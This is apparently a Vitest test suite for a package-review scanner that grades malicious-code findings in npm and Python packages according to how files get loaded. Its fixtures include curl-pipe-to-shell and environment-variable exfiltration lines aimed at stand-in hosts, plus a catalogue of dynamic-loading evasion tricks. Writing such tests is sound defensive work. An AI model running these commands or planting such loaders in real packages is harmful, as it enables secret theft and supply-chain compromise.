import { describe, expect, test } from "vitest";
import {
  annotateFindingsWithDiffStatus,
  computeRisk,
  createPackageDiff,
  deterministicFindings,
} from "../server/lib/review";
import { summarizeFile } from "../server/lib/tar-parser.js";

const PAYLOAD =
  "const cp=require('child_process');cp.exec('curl https://payload.example.invalid/a.sh | sh');" +
  "fetch('https://collect.example.invalid',{method:'POST',body:JSON.stringify(process.env)});\n";
const encoder = new TextEncoder();

async function parsed(entries) {
  return Promise.all(
    Object.entries(entries).map(([path, body]) =>
      summarizeFile(path, typeof body === "string" ? encoder.encode(body) : body),
    ),
  );
}

function manifest(fields) {
  return JSON.stringify({ name: "pkg", version: "1.0.0", ...fields });
}

function review(staged, previous = []) {
  const diff = createPackageDiff(previous, staged);
  const findings = annotateFindingsWithDiffStatus(
    deterministicFindings(staged, diff, undefined, { previousFiles: previous }),
    diff,
    { previousFiles: previous, stagedFiles: staged },
  );
  return {
    findings,
    ids: (file) =>
      findings
        .filter((finding) => finding.file === file)
        .map((finding) => `${finding.ruleId}:${finding.severity}`),
    releaseRisk: computeRisk(findings.filter((finding) => finding.releaseDelta)),
  };
}

describe("load grading never decides whether bytes are inspected", () => {
  test("a statically named minified bundle nothing runs is scanned one step lower", async () => {
    const staged = await parsed({
      "package.json": manifest({ main: "index.js" }),
      "index.js": "module.exports = 1;\n",
      "x.min.js": PAYLOAD,
    });
    const { ids, releaseRisk } = review(staged);
    expect(ids("x.min.js")).toEqual(
      expect.arrayContaining(["code.remote-shell:high", "code.process-execution:medium"]),
    );
    expect(ids("index.js")).toEqual([]);
    expect(releaseRisk).toBe("high");
  });

  test("a case-mismatched manifest path loads the bundle at full severity", async () => {
    const staged = await parsed({
      "package.json": manifest({ main: "Dist/A.min.js" }),
      "dist/a.min.js": PAYLOAD,
    });
    const { ids, releaseRisk } = review(staged);
    expect(ids("dist/a.min.js")).toContain("code.remote-shell:critical");
    expect(releaseRisk).toBe("critical");
  });

  test("a case-mismatched lifecycle command keeps the target at full severity", async () => {
    const staged = await parsed({
      "package.json": manifest({ scripts: { postinstall: "node Setup.min.js" } }),
      "setup.min.js": PAYLOAD,
    });
    expect(review(staged).ids("setup.min.js")).toContain("code.remote-shell:critical");
  });

  test("a NUL-prefixed root export target is decoded and scanned", async () => {
    const staged = await parsed({
      "package.json": manifest({ exports: { ".": "./lib/index.dat" } }),
      "lib/index.dat": encoder.encode(`/*\0*/${PAYLOAD}`),
    });
    const [, entry] = staged;
    expect(entry.flags).toEqual(["binary", "control-bytes"]);
    const { ids, releaseRisk } = review(staged);
    expect(ids("lib/index.dat")).toEqual(
      expect.arrayContaining(["code.remote-shell:critical", "file.control-bytes:high"]),
    );
    expect(releaseRisk).toBe("critical");
  });

  test.each([
    ["./payload.txt", "payload.txt"],
    ["./lib/payload", "lib/payload"],
  ])("require(%s) of a NUL-prefixed body is decoded and scanned", async (specifier, path) => {
    const staged = await parsed({
      "package.json": manifest({ main: "index.js" }),
      "index.js": `module.exports = require('${specifier}');\n`,
      [path]: encoder.encode(`\0${PAYLOAD}`),
    });
    expect(review(staged).ids(path)).toEqual(
      expect.arrayContaining(["code.remote-shell:critical", "file.control-bytes:high"]),
    );
  });

  test("require of a never-sampled source map is an unsampled load", async () => {
    const staged = await parsed({
      "package.json": manifest({ main: "index.js" }),
      "index.js": "module.exports = require('./lib/x.js.map');\n",
      "lib/x.js.map": PAYLOAD,
    });
    const { ids, releaseRisk } = review(staged);
    expect(ids("lib/x.js.map")).toEqual(["file.unsampled-entrypoint:high"]);
    expect(releaseRisk).toBe("high");
  });

  test("a hash-only main is an unsampled load", () => {
    const staged = [
      {
        path: "package.json",
        size: 40,
        sha256: "m",
        flags: [],
        textSample: manifest({ main: "index.js" }),
      },
      { path: "index.js", size: 4096, sha256: "i", flags: ["content-skipped"] },
    ];
    const { ids, releaseRisk } = review(staged);
    expect(ids("index.js")).toEqual(["file.unsampled-entrypoint:high"]);
    expect(releaseRisk).toBe("high");
  });

  test.each([
    ["control bytes", encoder.encode(`/*\0*/${PAYLOAD}`), "file.control-bytes"],
    ["no sample", encoder.encode(PAYLOAD), "file.unsampled-entrypoint"],
  ])(
    "a dormant file with %s activated by a main change is release-scoped high",
    async (_label, body, ruleId) => {
      const path = ruleId === "file.control-bytes" ? "lib/x.dat" : "lib/x.js.map";
      const previous = await parsed({
        "package.json": manifest({ main: "index.js" }),
        "index.js": "module.exports = 1;\n",
        [path]: body,
      });
      const staged = await parsed({
        "package.json": manifest({ version: "1.0.1", main: path }),
        "index.js": "module.exports = 1;\n",
        [path]: body,
      });
      const { findings, releaseRisk } = review(staged, previous);
      expect(findings.find((finding) => finding.ruleId === ruleId)).toMatchObject({
        file: path,
        severity: "high",
        releaseDelta: true,
      });
      expect(releaseRisk).toBe("high");

      // Already loaded before: package context, not this release.
      const unchanged = review(
        staged,
        staged.map((file) => (file.path === "package.json" ? { ...file, sha256: "old" } : file)),
      );
      expect(unchanged.findings.find((finding) => finding.ruleId === ruleId)).toMatchObject({
        severity: "medium",
        releaseDelta: false,
      });
    },
  );

  test("bare asset exports and imported media grade lower; proven-inert and unloaded bodies are quiet", async () => {
    const staged = await parsed({
      "package.json": manifest({
        main: "index.js",
        exports: { ".": "./index.js", "./map": "./dist/app.js.map", "./data": "./data/table.dat" },
      }),
      "index.js": "require('./logo.png');\nrequire('./spinner.gif');\n",
      "dist/app.js.map": '{"version":3}',
      "data/table.dat": encoder.encode("\0\x01\x02table"),
      "data/other.dat": encoder.encode("\0\x01\x02other"),
      "logo.png": new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0]),
      "spinner.gif": encoder.encode("GIF89a\x01\0\x02"),
    });
    const { ids } = review(staged);
    expect(ids("dist/app.js.map")).toEqual(["file.unsampled-entrypoint:medium"]);
    expect(ids("data/table.dat")).toEqual(["file.control-bytes:medium"]);
    expect(ids("spinner.gif")).toEqual(["file.control-bytes:medium"]);
    expect(ids("logo.png")).toEqual([]);
    expect(ids("data/other.dat")).toEqual([]);
  });
});

const EXFIL =
  "fetch('https://collect.example.invalid',{method:'POST',body:JSON.stringify(process.env)});\n";

describe("a dynamic loader keeps every file at full severity", () => {
  const loaders = [
    [
      "a computed require",
      (name) =>
        `const path = require('path');\nconst parts = ${JSON.stringify([...name])};\nrequire(path.join(__dirname, parts.join('')));\n`,
      // A plain module is scanned at full severity anyway; the computed require
      // names nothing worth flagging there.
      (payload) => (payload === "x.js" ? [] : ["code.dynamic-load:high"]),
    ],
    [
      "vm over a file read",
      (name) =>
        `const fs = require('fs'), vm = require('vm');\nconst f = __dirname + '/' + ${JSON.stringify(name)};\nvm.runInThisContext(fs.readFileSync(f, 'utf8'));\n`,
      () => ["code.dynamic-load:high"],
    ],
    [
      "module._compile",
      (name) =>
        `const fs = require('fs');\nconst f = __dirname + '/' + ${JSON.stringify(name)};\nmodule._compile(fs.readFileSync(f, 'utf8'), f);\n`,
      () => ["code.dynamic-load:high"],
    ],
    [
      "a require.extensions hook",
      () => "require.extensions['.txt'] = require.extensions['.js'];\n",
      () => ["code.dynamic-load:high"],
    ],
  ];
  const payloads = ["x.js", "x.min.js", "x.txt"];

  test.each(
    loaders.flatMap(([label, loader, loaderId]) =>
      payloads.map((payload) => [label, payload, loader, loaderId]),
    ),
  )("%s reaching %s: the exfil payload scores high", async (_label, payload, loader, loaderId) => {
    const previous = await parsed({
      "package.json": manifest({ main: "index.js" }),
      "index.js": "module.exports = 1;\n",
    });
    const staged = await parsed({
      "package.json": manifest({ version: "1.0.1", main: "index.js" }),
      "index.js": loader(payload),
      [payload]: EXFIL,
    });
    const { findings, ids, releaseRisk } = review(staged, previous);
    expect(ids(payload)).toEqual(
      expect.arrayContaining(["code.network-access:high", "code.credential-access:high"]),
    );
    expect(findings.filter((finding) => finding.file === payload && finding.loadUnproven)).toEqual(
      [],
    );
    expect(ids("index.js")).toEqual(loaderId(payload));
    expect(releaseRisk).toBe("high");
  });

  test("an unchanged loader still lifts a newly added payload to full severity", async () => {
    const index =
      "const path = require('path');\nmodule.exports = (name) => require(path.join(__dirname, name));\n";
    const previous = await parsed({
      "package.json": manifest({ main: "index.js" }),
      "index.js": index,
    });
    const staged = await parsed({
      "package.json": manifest({ version: "1.0.1", main: "index.js" }),
      "index.js": index,
      "x.txt": EXFIL,
    });
    const { findings, ids, releaseRisk } = review(staged, previous);
    expect(ids("x.txt")).toEqual(
      expect.arrayContaining(["code.network-access:high", "code.credential-access:high"]),
    );
    expect(findings.find((finding) => finding.file === "index.js")).toMatchObject({
      ruleId: "code.dynamic-load",
      severity: "low",
      releaseDelta: false,
    });
    expect(releaseRisk).toBe("high");
  });

  test("a loader the previous version already had is package context, not this release", async () => {
    const hook = "require.extensions['.ts'] = compile;\n";
    const previous = await parsed({
      "package.json": manifest({ main: "index.js" }),
      "index.js": `${hook}module.exports = 1;\n`,
    });
    const staged = await parsed({
      "package.json": manifest({ version: "1.0.1", main: "index.js" }),
      "index.js": `// rebuilt\n${hook}module.exports = 2;\n`,
    });
    const { findings, releaseRisk } = review(staged, previous);
    expect(findings.find((finding) => finding.ruleId === "code.dynamic-load")).toMatchObject({
      severity: "medium",
      releaseDelta: false,
    });
    expect(releaseRisk).toBe("low");
  });

  test.each([
    [
      "literal requires",
      "require('./a');\nrequire(\"./b\");\nimport('./c.js');\nrequire(`./d`);\n",
    ],
    ["a call inside a string", "const help = 'call require(name) to load';\n"],
    ["a comment", "// require(name) loads it\n"],
    ["an extensions table on another object", "this._extensions = {};\nws.extensions = offer;\n"],
  ])("%s are not dynamic loaders", async (_label, index) => {
    const staged = await parsed({
      "package.json": manifest({ main: "index.js" }),
      "index.js": index,
      "x.min.js": EXFIL,
    });
    const { findings, ids } = review(staged);
    expect(ids("index.js")).toEqual([]);
    expect(
      findings.filter((finding) => finding.file === "x.min.js").every((f) => f.loadUnproven),
    ).toBe(true);
  });

  test("a shim named require is no loader, but no longer proves loads static", async () => {
    const staged = await parsed({
      "package.json": manifest({ main: "index.js" }),
      "index.js": "function require(name) {\n  return modules[name];\n}\n",
      "x.min.js": EXFIL,
    });
    const { findings, ids } = review(staged);
    expect(ids("index.js")).toEqual([]);
    expect(
      findings.filter((finding) => finding.file === "x.min.js" && finding.loadUnproven),
    ).toEqual([]);
  });

  test("a bundle's computed require with nothing unloaded to reach is quiet", async () => {
    const staged = await parsed({
      "package.json": manifest({ main: "index.js" }),
      "index.js": "module.exports = (name) => require(name);\n",
      "x.min.js": "module.exports = 1;\n",
    });
    expect(review(staged).findings).toEqual([]);
  });
});

describe("demotion needs provably static loads", () => {
  // Each loads the payload through a path nothing in the package spells out.
  const target = (name) =>
    `const path = require('path');\nconst p = path.join(__dirname, ${JSON.stringify([...name])}.join(''));\n`;
  const read = "const fs = require('fs');\nconst src = fs.readFileSync(p, 'utf8');\n";
  const shapes = [
    ["require.main.require", "require.main.require(p);\n"],
    ["process.mainModule.require", "process.mainModule.require(p);\n"],
    ["a bracketed module.require", "module['require'](p);\n"],
    ["a concatenated module.require", "module['req' + 'uire'](p);\n"],
    ["require destructured off module", "const { require: ld } = module;\nld(p);\n"],
    ["Module._load", "require('module')._load(p);\n"],
    ["createRequire", "require('module').createRequire(__filename)(p);\n"],
    ["require.call", "require.call(null, p);\n"],
    ["require in an array", "const [ld] = [require];\nld(p);\n"],
    ["require in an object", "const o = { require };\no.require(p);\n"],
    ["child_process.fork", "require('child_process').fork(p);\n"],
    ["a worker thread", "const wt = require('worker_threads');\nnew wt.Worker(p);\n"],
    ["a bracketed vm call", `${read}require('vm')['runInThisContext'](src);\n`],
    ["Function over a file read", `${read}Function(src)();\n`],
    ["eval over a file read", `${read}eval(src);\n`],
    ["spawning node", "require('child_process').spawn('node', [p]);\n"],
    ["spawning argv[0]", "require('child_process').spawn(process.argv[0], [p]);\n"],
    ["spawning argv0", "require('child_process').spawn(process.argv0, [p]);\n"],
    ["node by another path", "require('child_process').execSync('/usr/bin/env node ' + p);\n"],
    ["process.dlopen", "process.dlopen(module, p);\n"],
  ];

  test.each(
    shapes.flatMap(([label, shape]) =>
      ["x.txt", "x.min.js"].map((payload) => [label, payload, shape]),
    ),
  )("%s reaching %s: the exfil payload scores high", async (_label, payload, shape) => {
    const previous = await parsed({
      "package.json": manifest({ main: "index.js" }),
      "index.js": "module.exports = 1;\n",
    });
    const staged = await parsed({
      "package.json": manifest({ version: "1.0.1", main: "index.js" }),
      "index.js": `${target(payload)}${shape}`,
      [payload]: EXFIL,
    });
    const { findings, ids, releaseRisk } = review(staged, previous);
    expect(findings.filter((finding) => finding.file === payload && finding.loadUnproven)).toEqual(
      [],
    );
    expect(ids("index.js")).toContain("code.dynamic-load:high");
    expect(releaseRisk).toBe("high");
  });

  test.each([
    [
      "literal requires and imports",
      "const a = require('./a');\nimport('./c.js');\nmodule.exports = typeof require === 'function' && require.resolve('./b');\n",
    ],
    [
      "a UMD guard",
      "if (typeof module === 'object' && module.exports) module.exports = factory();\n",
    ],
    [
      "Function.prototype",
      "const call = Function.prototype.call;\nmodule.exports = (f) => f instanceof Function;\n",
    ],
    [
      "prose and strings",
      "// eval(src) and require(name) are not used here\nconst help = 'require(name)';\n",
    ],
  ])("%s keep demotion", async (_label, index) => {
    const staged = await parsed({
      "package.json": manifest({ main: "index.js" }),
      "index.js": index,
      "x.min.js": EXFIL,
    });
    const { findings } = review(staged);
    const payload = findings.filter((finding) => finding.file === "x.min.js");
    expect(payload.length).toBeGreaterThan(0);
    expect(payload.every((finding) => finding.loadUnproven)).toBe(true);
  });

  test.each([
    [
      "an esbuild require shim",
      "var __require = typeof require !== 'undefined' ? require : null;\n",
    ],
    ["eval anywhere", "module.exports = (s) => eval(s);\n"],
    ["the vm builtin", "const vm = require('vm');\n"],
    ["a computed key on process", "const k = Buffer.from(s, 'base64').toString();\nprocess[k];\n"],
    ["Reflect.get on process", "Reflect.get(process, k);\n"],
    [
      "the AsyncFunction constructor",
      "const AF = Object.getPrototypeOf(async function () {}).constructor;\n",
    ],
    ["an async arrow's constructor", "const AF = (async () => {}).constructor;\n"],
    ["a native addon", null],
  ])("%s disable demotion package-wide", async (_label, index) => {
    const staged = await parsed({
      "package.json": manifest({ main: "index.js" }),
      "index.js": index ?? "module.exports = require('./build/addon.node');\n",
      ...(index === null ? { "build/addon.node": new Uint8Array([0x7f, 0x45, 0x4c, 0x46]) } : {}),
      "x.min.js": EXFIL,
    });
    const { findings } = review(staged);
    expect(
      findings.filter((finding) => finding.file === "x.min.js" && finding.loadUnproven),
    ).toEqual([]);
  });

  test.each([
    ["exec over a read", "exec(open(path).read())\n"],
    ["importlib", "import importlib\nimportlib.import_module(name)\n"],
    ["sys.path", "import sys\nsys.path.insert(0, here)\n"],
  ])("Python %s disables demotion", async (_label, source) => {
    const files = (module) => ({
      "PKG-INFO": "Metadata-Version: 2.1\nName: pkg\nVersion: 1.0.0\n",
      "pkg/__init__.py": module,
      "pkg/data.txt":
        "import os, urllib.request\nurllib.request.urlopen('https://collect.example.invalid', data=str(dict(os.environ)).encode())\n",
    });
    const unproven = async (module) => {
      const staged = await parsed(files(module));
      return deterministicFindings(staged, createPackageDiff([], staged), undefined, {
        codePatternSet: "python",
      }).filter((finding) => finding.file === "pkg/data.txt" && finding.loadUnproven);
    };
    expect((await unproven("VERSION = 1\n")).length).toBeGreaterThan(0);
    expect(await unproven(source)).toEqual([]);
  });
});

describe("Python source encoding", () => {
  test.each([
    ["# coding: utf-7", "file.python-source-encoding:high"],
    ["#!/usr/bin/env python\n# -*- coding: UTF_16 -*-", "file.python-source-encoding:high"],
    ["# vim: set fileencoding=cp1252 :", "file.python-source-encoding:low"],
    ["# -*- coding: utf-8 -*-", null],
    ["# coding=latin-1", null],
    ["# coding: ascii", null],
    ["import os\nimport sys\n# coding: utf-7", null],
  ])("%j", async (header, expected) => {
    const staged = await parsed({ "setup.py": `${header}\n+AGk-mport os\n` });
    const ids = review(staged)
      .ids("setup.py")
      .filter((id) => id.startsWith("file.python-source-encoding"));
    expect(ids).toEqual(expected ? [expected] : []);
  });
});
